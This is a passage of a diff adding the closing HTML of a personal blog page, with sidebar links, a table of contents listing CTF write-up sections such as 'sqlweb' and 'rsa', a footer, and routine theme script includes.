+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">24</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/Merl1ng" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/Merl1ng" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">1.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#calc"><span class="nav-number">1.1.</span> <span class="nav-text">calc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wafupload"><span class="nav-number">1.2.</span> <span class="nav-text">wafupload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unfinish"><span class="nav-number">1.3.</span> <span class="nav-text">unfinish</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlweb"><span class="nav-number">1.4.</span> <span class="nav-text">sqlweb</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#misc"><span class="nav-number">2.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#套娃"><span class="nav-number">2.1.</span> <span class="nav-text">套娃</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#虚幻"><span class="nav-number">2.2.</span> <span class="nav-text">虚幻</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#crypto"><span class="nav-number">3.</span> <span class="nav-text">crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#rsa"><span class="nav-number">3.1.</span> <span class="nav-text">rsa</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Merl1ng</span>
+</div>
+
+
+<div class="powered-by">
+   Love life 
+</div>
+
+<div class="theme-info">
+  Love gakki 
+  
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
